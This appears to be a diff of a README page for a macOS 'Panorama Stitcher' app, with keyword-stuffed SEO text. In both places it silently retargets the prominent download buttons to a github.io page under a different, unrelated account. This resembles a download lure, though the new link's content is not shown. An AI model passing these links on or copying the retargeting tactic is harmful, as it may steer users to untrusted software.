@@ -4,7 +4,7 @@
 
 <!-- Download Button #1 — badge/shield style -->
 <div align="center" style="margin:12px 0 18px;">
-  <a href="http://panorama-stitcher.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/Panorama">
     <img src="https://img.shields.io/badge/⬇️_GET_PANORAMA_STITCHER-royalblue?style=for-the-badge&logo=aperture&logoColor=white" alt="Download Panorama Stitcher for macOS">
   </a>
 </div>
@@ -149,7 +149,7 @@ panorama stitcher • pano maker mac • panorama software macOS • cylindrical
 
 <!-- Download Button #2 — pill/gradient style -->
 <div align="center" style="margin:16px 0 22px;">
-  <a href="http://panorama-stitcher.github.io/.github" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#3b82f6,#06b6d4);color:#fff;font-weight:800;text-decoration:none;box-shadow:0 8px 22px rgba(59,130,246,.25);">
+  <a href="https://rumpels-kaji.github.io/.github/Panorama" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#3b82f6,#06b6d4);color:#fff;font-weight:800;text-decoration:none;box-shadow:0 8px 22px rgba(59,130,246,.25);">
     🧩 Download Panorama Stitcher for macOS
   </a>
 </div>
